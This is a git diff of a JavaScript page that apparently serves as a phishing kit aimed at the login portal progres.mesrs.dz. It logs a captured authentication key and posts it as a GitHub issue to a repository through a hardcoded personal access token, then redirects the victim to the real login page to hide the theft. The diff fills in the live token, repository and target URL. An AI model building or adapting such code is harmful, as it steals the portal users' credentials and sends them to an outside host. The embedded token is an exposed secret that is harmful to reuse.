@@ -180,9 +180,9 @@
         console.log("Logging Key:", authKey);
 
         // 🔵 GitHub API Configuration
-        const GITHUB_TOKEN = "YOUR_GITHUB_TOKEN"; // Replace with your actual GitHub token
-        const REPO_OWNER = "YOUR_GITHUB_USERNAME"; // Replace with your GitHub username
-        const REPO_NAME = "YOUR_REPOSITORY_NAME"; // Replace with your repository name
+        const GITHUB_TOKEN = "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"; // Replace with your actual GitHub token
+        const REPO_OWNER = "ZA3MA3"; // Replace with your GitHub username
+        const REPO_NAME = "progres"; // Replace with your repository name
 
         // 📝 Create an issue on GitHub
         fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/issues`, {
@@ -202,7 +202,7 @@
             console.log("Issue Created:", data);
 
             // ✅ Redirect after storing data
-            var targetSite = "http://site"; 
+            var targetSite = "https://progres.mesrs.dz/webfve/login.xhtml"; 
             window.location.replace(targetSite);
         })
         .catch(error => console.error("Error:", error));
